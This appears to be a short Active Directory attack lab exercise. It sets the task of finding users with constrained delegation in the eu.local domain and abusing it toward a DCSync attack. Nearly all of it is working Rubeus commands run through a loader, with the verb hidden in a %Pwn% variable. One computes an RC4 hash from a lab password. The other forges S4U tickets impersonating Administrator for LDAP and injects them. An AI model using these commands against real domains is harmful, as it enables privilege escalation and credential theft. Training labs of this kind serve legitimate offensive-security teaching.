
Task 

• Enumerate users in the eu.local domain for whom Constrained Delegation is enabled. 
• Abuse the Delegation to execute DCSync attack against eu.local.

```
echo %Pwn% hash
```

```
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /password:Qwerty@123 /user:storagesvc /domain:eu.local
```

```
echo %Pwn% s4u
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args
%Pwn% /user:storagesvc /rc4:5C76877A9C454CDED58807C20C20AEAC
/impersonateuser:Administrator /domain:eu.local /msdsspn:nmagent/eudc.eu.local /altservice:ldap /dc:eu-dc.eu.local /ptt
```

